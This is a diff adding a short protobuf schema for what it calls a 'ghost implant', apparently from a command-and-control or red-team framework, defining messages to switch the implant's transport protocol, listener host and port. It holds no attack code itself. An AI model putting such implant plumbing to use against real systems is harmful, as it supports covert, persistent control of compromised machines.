@@ -1,0 +1,15 @@
+syntax = "proto3";
+
+package transport;
+// option go_package = "ghost/transport";
+
+// The ghost implant can change either the connection address and/or the transport protocol used.
+// These are requests and responses to do so.
+
+message ChangeTransportRequest {
+        string Protocol = 1;
+        string LHost = 2;
+        string LPort = 3;
+}
+
+message ChangeTransport {}
